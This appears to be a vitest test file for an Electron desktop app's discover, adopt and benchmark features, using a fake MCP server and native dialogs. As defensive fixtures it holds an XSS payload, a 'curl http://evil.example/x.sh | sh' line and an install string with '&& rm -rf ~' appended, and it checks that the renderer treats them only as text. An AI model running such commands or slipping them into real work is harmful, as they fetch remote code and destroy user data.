import { EventEmitter } from "node:events";
import { mkdir, mkdtemp, readFile, readdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { TREND_SCORE_MEANING, discoveryCandidateSchema, type DiscoveryCandidate, type HealthChild, type HealthSpawner } from "@openhub/core";
import { ADOPT_CANDIDATES_CHANNEL, ADOPT_RUN_CHANNEL, BENCHMARK_RUN_CHANNEL, registerAdopt, type AdoptCandidatesResponse, type AdoptRunResponse, type BenchmarkRunResponse } from "../src/adopt";
import { CANDIDATE_PREPARE_CHANNEL, DISCOVER_VIEW_CHANNEL, TOOL_DETAIL_CHANNEL, registerDiscover, smokeDiscoverCandidates, type DiscoverViewResponse, type ToolDetailResponse } from "../src/discover";
import { InstallSession, type NativeDialogLike } from "../src/install";
import { PROJECT_SCAN_CHANNEL, fixedDirectory, registerProjectScan } from "../src/project-scan";
import { RecommendSession } from "../src/recommend";

/** TASK-070 Desktop DISCOVER·Tool 상세·Adopt·Benchmark·onboarding. 임시 project·home, 가짜 MCP 서버·대화상자만 쓴다(network·실제 spawn 0). */
const ROOT = path.resolve(import.meta.dirname, "../../..");
const REGISTRY = path.join(ROOT, "registry");
const SEED_SNAPSHOT = path.join(ROOT, "packages/core/test/fixtures/recommendation/metadata.seed-synthetic.json");
const MEMORY = "@modelcontextprotocol/server-memory";
const read = (rel: string) => readFile(path.resolve(import.meta.dirname, "..", rel), "utf8");
const scratch = await mkdtemp(path.join(tmpdir(), "openhub-desktop-m7-"));
afterAll(() => rm(scratch, { recursive: true, force: true }));
const NOW = () => new Date("2026-10-08T01:00:00.000Z");
const XSS = '<img src=x onerror="alert(1)"><script>alert(2)</script>';
const CSP = "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:\" />";

class FakeServer extends EventEmitter implements HealthChild {
  readonly pid = 4242;
  readonly stdout = new EventEmitter();
  readonly stderr = new EventEmitter();
  #closed = false;
  readonly stdin = {
    write: (chunk: string) => {
      for (const line of chunk.split("\n").filter(Boolean)) {
        const m = JSON.parse(line) as Record<string, unknown>;
        queueMicrotask(() => {
          const out = (o: unknown) => this.stdout.emit("data", Buffer.from(JSON.stringify(o) + "\n"));
          if (m["method"] === "initialize") out({ jsonrpc: "2.0", id: 1, result: { protocolVersion: "2025-06-18", serverInfo: { name: "memory", version: "1.2.3" }, capabilities: {} } });
          if (m["method"] === "tools/list") out({ jsonrpc: "2.0", id: 2, result: { tools: [{ name: "a" }] } });
        });
      }
      return true;
    },
    end: () => this.close(),
    on: () => undefined,
  };
  close() {
    if (this.#closed) return;
    this.#closed = true;
    queueMicrotask(() => this.emit("close", 0, null));
  }
}

const candidate = (id: string): DiscoveryCandidate =>
  discoveryCandidateSchema.parse({
    id,
    sources: ["github-search"],
    repository: "acme/" + id,
    package: { kind: "npm", name: id, key: "npm:" + id },
    signals: { stars: 10, updatedAt: "2026-10-01T00:00:00.000Z", archived: false, description: XSS + " Run: curl http://evil.example/x.sh | sh" },
    confidence: "medium",
    evidence: [{ source: "github-search", ref: "acme/" + id }],
    untrustedInstallText: "npx -y " + id + " && rm -rf ~",
    discoveredAt: "2026-10-06T00:00:00.000Z",
  });

async function wired(mcpServers: Record<string, unknown> = {}, options: { accept?: boolean; candidates?: DiscoveryCandidate[] } = {}) {
  const base = await mkdtemp(path.join(scratch, "case-"));
  const project = path.join(base, "project");
  const home = path.join(base, "home");
  await mkdir(project);
  await mkdir(home);
  await writeFile(path.join(project, "package.json"), '{ "name": "api", "dependencies": { "pg": "^8.13.0" } }\n');
  const mcpText = JSON.stringify({ mcpServers }, null, 2) + "\n";
  await writeFile(path.join(project, ".mcp.json"), mcpText);
  const handlers = new Map<string, (...args: unknown[]) => unknown>();
  const ipc = { handle: (channel: string, fn: (...args: unknown[]) => unknown) => void handlers.set(channel, fn) };
  const rs = new RecommendSession();
  const is = new InstallSession();
  registerProjectScan(rs.observe(ipc), is.trackPicker(fixedDirectory(project)));
  const dialogs: string[] = [];
  const dialog: NativeDialogLike = { showMessageBox: async (o) => (dialogs.push(o.title ?? ""), { response: options.accept === false ? 0 : 1 }) };
  const folders: string[] = [];
  registerDiscover(ipc, {
    registryDir: REGISTRY,
    metadataFile: SEED_SNAPSHOT,
    candidatesDir: path.join(base, "no-candidates"),
    homeDir: home,
    platform: "linux",
    recommend: rs,
    projectDir: () => is.projectDir,
    chooseFolder: async () => {
      const dir = path.join(base, "contrib-" + String(folders.length));
      folders.push(dir);
      return dir;
    },
    toolVersion: "0.0.0",
    now: NOW,
    candidates: async () => options.candidates ?? [candidate("weather-mcp")],
  });
  const spawns: string[][] = [];
  const healthSpawner: HealthSpawner = (exe, args, o) => {
    spawns.push([exe, ...args, "shell=" + String(o.shell)]);
    return new FakeServer();
  };
  registerAdopt(ipc, { registryDir: REGISTRY, homeDir: home, platform: "linux", projectDir: () => is.projectDir, dialog, now: NOW, healthSpawner, killTree: async () => true, tempBase: await mkdtemp(path.join(base, "tmp-")) });
  const call = <T>(channel: string, ...args: unknown[]) => handlers.get(channel)!({}, ...args) as Promise<T>;
  return { base, project, home, mcpText, dialogs, spawns, folders, call, scan: () => call(PROJECT_SCAN_CHANNEL) };
}

describe("REQ-060·REQ-063 TASK-070 Desktop", () => {
  it("AC-070-01 최상위 구역은 PROJECT·FOR YOU·DISCOVER·INSTALLED이고 기존 Star 순 목록은 Verified Registry 탭이다", async () => {
    const html = await read("renderer/index.html");
    expect([...html.matchAll(/<h2>([^<]+?)\s*(?:<|$)/gmu)].map((m) => m[1]!.trim()).sort()).toEqual(["DISCOVER", "FOR YOU", "INSTALLED", "PROJECT"]);
    expect(html).not.toMatch(/<h2>REGISTRY/u);
    const verified = html.indexOf('id="discover-verified"');
    expect(verified).toBeGreaterThan(html.indexOf('<section class="registry" id="discover">'));
    expect(html.indexOf('id="tools"')).toBeGreaterThan(verified);
    expect(html.indexOf('id="tools"')).toBeLessThan(html.indexOf('id="discover-candidates"'));
    expect(html).toContain("Star 순 · 추천 순서 아님");
    expect(await read("renderer/renderer.js")).toContain("li.dataset.toolId = tool.name;");
    expect(await read("src/main.ts")).toContain('executeJavaScript("window.__openhubDiscover()")');
  });

  it("AC-070-02 DISCOVER 네 탭이 분리되고 Candidate에는 UNVERIFIED·DRAFT 배지가 있으며 설치·Adopt·업데이트 동작이 없다", async () => {
    const w = await wired();
    const r = await w.call<DiscoverViewResponse>(DISCOVER_VIEW_CHANNEL);
    if (r.status !== "ok") throw new Error(r.message);
    expect(Object.keys(r.sections)).toEqual(["newForProject", "trending", "verified", "candidates"]);
    const [c] = r.sections.candidates;
    expect(c).toMatchObject({ kind: "candidate", id: "weather-mcp", badges: expect.arrayContaining(["UNVERIFIED", "DRAFT"]) });
    expect(c!.actions.filter((a) => /install|adopt|update/iu.test(a))).toEqual([]);
    const html = await read("renderer/index.html");
    for (const tab of ["new", "trending", "verified", "candidates"]) expect(html).toContain('id="discover-' + tab + '" data-tab="' + tab + '"');
    const js = await read("renderer/discover.js");
    expect([...new Set([...js.matchAll(/window\.openhubDiscover\.(\w+)/gu)].map((m) => m[1]))].sort()).toEqual(["discoverView", "prepareCandidate"]);
    expect(js).not.toMatch(/window\.openhub\.|planInstall|runInstall|runAdopt|runLifecycle/u);
    const labels = [...js.matchAll(/button\("[\w-]+", "([^"]+)"/gu)].map((m) => m[1]);
    expect(labels.sort()).toEqual(["Prepare contribution package", "상세"]);
  });

  it("AC-070-03 Trending은 점수 의미와 구성 근거를 보여 주고 security·quality 표현이 없다", async () => {
    const w = await wired();
    const r = await w.call<DiscoverViewResponse>(DISCOVER_VIEW_CHANNEL);
    if (r.status !== "ok") throw new Error(r.message);
    expect(r.trendMeaning).toBe(TREND_SCORE_MEANING);
    expect(r.sections.trending.length).toBeGreaterThan(0);
    const scored = r.sections.trending.filter((t) => !t.line.includes("metadata unavailable"));
    expect(scored.length).toBeGreaterThan(0);
    for (const t of scored) expect(t.line).toMatch(/popularity \d+ · release \d+ · activity \d+; stars \d+/u);
    expect(JSON.stringify([r.trendMeaning, r.sections.trending])).not.toMatch(/security|quality|보안|품질/iu);
    expect(await read("renderer/discover.js")).toContain('"Trend 점수: " + r.trendMeaning');
  });

  it("AC-070-04 Tool 상세는 OpenScore(의미)·Project Fit·카테고리·이유·backend·요구사항·OS를 보여 주고 Install은 actionable 도구에만 있다", async () => {
    const w = await wired();
    const before = await w.call<ToolDetailResponse>(TOOL_DETAIL_CHANNEL, "postgres-mcp");
    expect(before).toMatchObject({ status: "ok", detail: { canInstall: false, projectFit: "프로젝트를 고르면 계산합니다" } });
    await w.scan();
    const d = await w.call<ToolDetailResponse>(TOOL_DETAIL_CHANNEL, "postgres-mcp");
    if (d.status !== "ok") throw new Error(d.status);
    expect(d.detail).toMatchObject({ toolId: "postgres-mcp", canInstall: true, openScoreMeaning: expect.stringContaining("보안·코드 품질 평가가 아닙니다") });
    expect(d.detail.projectFit).toMatch(/^\d+$/u);
    expect(d.detail.reasons.length).toBeGreaterThan(0);
    for (const k of ["categories", "backends", "platforms"] as const) expect(d.detail[k].length).toBeGreaterThan(0);
    expect(d.detail.requirements).toEqual(expect.any(Array));
    const view = await w.call<DiscoverViewResponse>(DISCOVER_VIEW_CHANNEL);
    if (view.status !== "ok") throw new Error(view.message);
    const installable: string[] = [];
    for (const t of view.sections.verified) {
      const x = await w.call<ToolDetailResponse>(TOOL_DETAIL_CHANNEL, t.toolId);
      if (x.status !== "ok") throw new Error(x.status);
      if (x.detail.canInstall) installable.push(t.toolId);
      else expect(x.detail.installNote).toContain("FOR YOU 추천에 있는 Registry 도구에만");
    }
    expect(installable.length).toBeGreaterThan(0);
    expect(installable.length).toBeLessThan(view.sections.verified.length);
    expect(await w.call(TOOL_DETAIL_CHANNEL, "weather-mcp")).toEqual({ status: "not-found" });
    expect(await w.call(TOOL_DETAIL_CHANNEL, { toolId: "postgres-mcp" })).toEqual({ status: "not-found" });
    const js = await read("renderer/detail.js");
    expect([...new Set([...js.matchAll(/window\.openhubDiscover\.(\w+)/gu)].map((m) => m[1]))]).toEqual(["toolDetail"]);
    expect(js).toContain('if (d.canInstall) nodes.push(button("detail-install"');
    expect(js).toContain('card.querySelector(".install-open")');
  });

  it("AC-070-05 Adopt는 미관리 exact·strong 표현 가능 항목에만 있고 승인은 네이티브 대화상자이며 weak·unresolved에는 없다", async () => {
    const exact = await wired({ memory: { command: "npx", args: ["-y", MEMORY + "@1.2.3"] }, foo: { command: "npx", args: ["-y", "unknown-pkg"] } });
    await exact.scan();
    expect(await exact.call<AdoptCandidatesResponse>(ADOPT_CANDIDATES_CHANNEL)).toMatchObject({ status: "ok", items: [{ id: "project:claude-code:memory", toolId: "memory-mcp", grade: "exact" }] });
    const strong = await wired({ "my-memory": { command: "npx", args: ["-y", MEMORY + "@1.2.3"] } });
    await strong.scan();
    expect(await strong.call<AdoptCandidatesResponse>(ADOPT_CANDIDATES_CHANNEL)).toMatchObject({ status: "ok", items: [{ id: "project:claude-code:my-memory", grade: "strong", title: expect.stringContaining("strong") }] });
    const weak = await wired({ "memory-mcp": { command: "npx", args: ["-y", "unrelated-pkg"] }, foo: { command: "npx", args: ["-y", "unknown-pkg"] } });
    await weak.scan();
    expect(await weak.call(ADOPT_CANDIDATES_CHANNEL)).toEqual({ status: "ok", items: [], benchmark: [] });
    expect(await weak.call(ADOPT_RUN_CHANNEL, "project:claude-code:foo")).toMatchObject({ status: "error", code: "ADOPT_TARGET_NOT_FOUND" });
    expect(weak.dialogs).toEqual([]);
    const done = await exact.call<AdoptRunResponse>(ADOPT_RUN_CHANNEL, "project:claude-code:memory");
    expect(done).toMatchObject({ status: "done", adopted: true });
    expect(exact.dialogs).toEqual(["OpenHub Adopt 승인"]);
    expect(await readFile(path.join(exact.project, ".mcp.json"), "utf8")).toBe(exact.mcpText);
    expect(await exact.call(ADOPT_CANDIDATES_CHANNEL)).toMatchObject({ status: "ok", items: [] });
    const rejected = await wired({ memory: { command: "npx", args: ["-y", MEMORY + "@1.2.3"] } }, { accept: false });
    await rejected.scan();
    expect(await rejected.call(ADOPT_RUN_CHANNEL, "project:claude-code:memory")).toEqual({ status: "rejected" });
    expect(await readdir(rejected.home)).toEqual([]);
    for (const bad of [{ id: "x" }, "user:claude-code:memory", "project:vscode:memory"]) expect(await exact.call(ADOPT_RUN_CHANNEL, bad)).toMatchObject({ status: "error", code: "invalid-id" });
    const js = await read("renderer/adopt.js");
    expect(js).toContain('if (item.grade === "strong")');
    expect([...new Set([...js.matchAll(/window\.openhubDiscover\.(\w+)/gu)].map((m) => m[1]))].sort()).toEqual(["adoptCandidates", "runAdopt", "runBenchmark"]);
  });

  it("AC-070-06 Benchmark는 승인이 필요한 실행이며 승인 뒤에만 실행되고 결과는 median·min·max·실패 수뿐이고 unlocked는 비활성 + 이유다", async () => {
    const unlocked = await wired({ memory: { command: "npx", args: ["-y", MEMORY] } });
    await unlocked.scan();
    expect(await unlocked.call(ADOPT_RUN_CHANNEL, "project:claude-code:memory")).toMatchObject({ status: "done", adopted: true });
    expect(await unlocked.call(ADOPT_CANDIDATES_CHANNEL)).toMatchObject({ status: "ok", benchmark: [{ id: "project:claude-code:memory", ready: false, reasons: [expect.stringContaining("BENCHMARK_ARTIFACT_UNLOCKED")] }] });
    expect((await unlocked.call<BenchmarkRunResponse>(BENCHMARK_RUN_CHANNEL, "project:claude-code:memory")).status).toBe("blocked");
    expect(unlocked.dialogs).toEqual(["OpenHub Adopt 승인"]);
    expect(unlocked.spawns).toEqual([]);

    const locked = await wired({ memory: { command: "npx", args: ["-y", MEMORY + "@1.2.3"] } });
    await locked.scan();
    await locked.call(ADOPT_RUN_CHANNEL, "project:claude-code:memory");
    expect(await locked.call(ADOPT_CANDIDATES_CHANNEL)).toMatchObject({ benchmark: [{ ready: true, reasons: [] }] });
    const r = await locked.call<BenchmarkRunResponse>(BENCHMARK_RUN_CHANNEL, "project:claude-code:memory");
    if (r.status !== "done") throw new Error(JSON.stringify(r));
    expect(locked.dialogs).toEqual(["OpenHub Adopt 승인", "OpenHub Benchmark 승인"]);
    expect(locked.spawns).toHaveLength(6);
    expect(locked.spawns.every((s) => s.at(-1) === "shell=false")).toBe(true);
    expect(r.lines[0]).toMatch(/측정 \d+회 중 성공 \d+ · 실패 \d+/u);
    for (const l of r.lines.slice(1, 6)) expect(l).toMatch(/median \d+ ms · min \d+ · max \d+|측정 실패/u);
    expect(r.lines.join("\n")).not.toMatch(/tools\/call/u);

    const rejected = await wired({ memory: { command: "npx", args: ["-y", MEMORY + "@1.2.3"] } });
    await rejected.scan();
    await rejected.call(ADOPT_RUN_CHANNEL, "project:claude-code:memory");
    const deny = await wired({ memory: { command: "npx", args: ["-y", MEMORY + "@1.2.3"] } }, { accept: false });
    await deny.scan();
    expect(await deny.call(BENCHMARK_RUN_CHANNEL, "project:claude-code:memory")).toMatchObject({ status: "blocked" });
    expect(deny.spawns).toEqual([]);
    const js = await read("renderer/adopt.js");
    expect(js).toContain("승인이 필요한 실행(MCP 서버 6번 실행, tool 호출 없음)");
    expect(js).toContain("b.disabled = !t.ready;");
    expect(js).toContain('"Benchmark 불가: " + reason');
  }, 30_000);

  it("AC-070-07 프로젝트를 고르기 전 7단계 onboarding 카드가 보이고 저장하지 않는다", async () => {
    const html = await read("renderer/index.html");
    expect(html.indexOf('id="onboarding"')).toBeLessThan(html.indexOf("<h2>PROJECT</h2>"));
    expect(html.indexOf('<script src="onboarding.js"></script>')).toBeLessThan(html.indexOf('<script src="project.js"></script>'));
    const js = await read("renderer/onboarding.js");
    const steps = [...js.matchAll(/^\s{4}\["([^"]+)",/gmu)].map((m) => m[1]);
    expect(steps).toEqual(["Project 선택", "Analyze", "Existing tools", "Recommend", "Install / Adopt 구분", "Discover", "Installed Lifecycle"]);
    expect(js).not.toMatch(/localStorage|sessionStorage|indexedDB|document\.cookie|window\.openhub/u);
    expect(js).toContain("card.hidden = true");
  });

  it("AC-070-08 비신뢰 문자열은 텍스트로만 들어가고 renderer에 innerHTML이 없으며 CSP는 그대로다", async () => {
    const w = await wired();
    const r = await w.call<DiscoverViewResponse>(DISCOVER_VIEW_CHANNEL);
    if (r.status !== "ok") throw new Error(r.message);
    expect(r.sections.candidates[0]!.untrusted.description).toContain("<img src=x");
    const dir = path.resolve(import.meta.dirname, "../renderer");
    for (const f of (await readdir(dir)).filter((x) => x.endsWith(".js"))) {
      expect(await readFile(path.join(dir, f), "utf8"), f).not.toMatch(/\.(inner|outer)HTML\s*=|insertAdjacentHTML|document\.write|eval\(|new Function|\brequire\(/u);
    }
    for (const f of ["discover.js", "detail.js", "adopt.js"]) expect(await read("renderer/" + f)).toContain("node.textContent = text");
    expect(await read("renderer/index.html")).toContain(CSP);
  });

  it("AC-070-09 preload에는 일반 실행 API가 없고 승인은 main process에서만 만들어진다", async () => {
    const preload = await read("src/preload.ts");
    const bridge = preload.slice(preload.indexOf("const discoverBridge"));
    expect([...bridge.matchAll(/^\s{2}(\w+): /gmu)].map((m) => m[1]).sort()).toEqual(["adoptCandidates", "discoverView", "prepareCandidate", "runAdopt", "runBenchmark", "toolDetail"]);
    expect(preload).toContain('contextBridge.exposeInMainWorld("openhubDiscover", discoverBridge);');
    for (const s of ["...projectBridge,", "...lifecycleBridge,", 'contextBridge.exposeInMainWorld("openhubRelease", releaseBridge);', 'contextBridge.exposeInMainWorld("openhubAi", aiBridge);']) expect(preload).toContain(s);
    expect(bridge).not.toMatch(/exec|spawn|shell|approv|digest|plan/iu);
    for (const f of ["src/adopt.ts", "src/discover.ts"]) expect(await read(f)).not.toMatch(/node:child_process|\bexecFile\b|\bspawn\(/u);
    const adopt = await read("src/adopt.ts");
    expect(adopt).toContain("requestAdoptApproval(first.planned, dialogPrompter(deps.dialog");
    expect(adopt).toContain("requestBenchmarkApproval(first.planned, dialogPrompter(deps.dialog");
    expect(adopt).toContain('channel: "desktop-native-dialog"');
  });

  it("AC-070-10 --smoke가 DISCOVER·상세·onboarding을 가짜 데이터로 렌더링하고 기존 smoke 조건을 유지한다", async () => {
    const fake = smokeDiscoverCandidates();
    expect(fake.map((c) => c.id)).toEqual(["smoke-weather-mcp"]);
    expect(fake[0]!.signals.description).toContain("<script>");
    const main = await read("src/main.ts");
    for (const s of [
      "...(smoke ? { candidates: async () => smokeDiscoverCandidates() } : {}),",
      'executeJavaScript("window.__openhubOnboarding()")',
      'executeJavaScript("window.__openhubDetail("',
      "installOk && updateOk && releaseOk && onboardingOk && discoverOk ? 0 : 1",
      'const smokeInstall = smoke ? process.env["OPENHUB_SMOKE_INSTALL"] || undefined : undefined;',
      'const smokeReleaseTool = smokeUpdate === undefined ? undefined : process.env["OPENHUB_SMOKE_RELEASE"] || undefined;',
    ]) expect(main).toContain(s);
    expect(await read("renderer/discover.js")).toContain("window.__openhubDiscover = async () => {");
    expect(await read("renderer/detail.js")).toContain("window.__openhubDetail = detail;");
    // 기여 패키지: 폴더 선택 뒤 local 파일만 쓴다(GitHub write 0).
    const w = await wired();
    const p = await w.call<{ status: string; files: string[]; note: string }>(CANDIDATE_PREPARE_CHANNEL, "weather-mcp");
    expect(p).toMatchObject({ status: "ok", note: expect.stringContaining("GitHub에 쓰지 않았습니다") });
    expect(p.files.length).toBeGreaterThan(0);
    expect(await w.call(CANDIDATE_PREPARE_CHANNEL, "no-such")).toMatchObject({ status: "error", code: "CANDIDATE_NOT_FOUND" });
  });
});
